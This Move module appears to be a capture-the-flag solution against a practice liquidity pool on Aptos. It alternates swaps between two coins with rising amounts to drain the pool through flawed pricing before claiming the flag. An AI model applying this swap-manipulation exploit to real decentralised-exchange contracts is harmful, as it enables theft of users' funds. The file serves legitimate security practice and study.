module attack::solve4 {
    use std::signer;
    use aptos_framework::coin;

    use ctfmovement::pool::{Self, Coin1, Coin2};

    public entry fun solve(attacker: &signer) {
        pool::get_coin(attacker);
        let coin1 = coin::withdraw<Coin1>(attacker, 5);
        let coin2 = coin::withdraw<Coin2>(attacker, 5);
        let coin22 = pool::swap_12(&mut coin1, 5);
        coin::deposit(signer::address_of(attacker), coin1);
        coin::merge(&mut coin2, coin22);
        let coin1 = pool::swap_21(&mut coin2, 10);
        coin::deposit(signer::address_of(attacker), coin2);
        let coin2 = pool::swap_12(&mut coin1, 12);
        coin::deposit(signer::address_of(attacker), coin1);
        let coin1 = pool::swap_21(&mut coin2, 15);
        coin::deposit(signer::address_of(attacker), coin2);
        let coin2 = pool::swap_12(&mut coin1, 20);
        coin::deposit(signer::address_of(attacker), coin1);
        let coin1 = pool::swap_21(&mut coin2, 24);
        coin::deposit(signer::address_of(attacker), coin1);
        coin::deposit(signer::address_of(attacker), coin2);

        pool::get_flag(attacker);
    }
}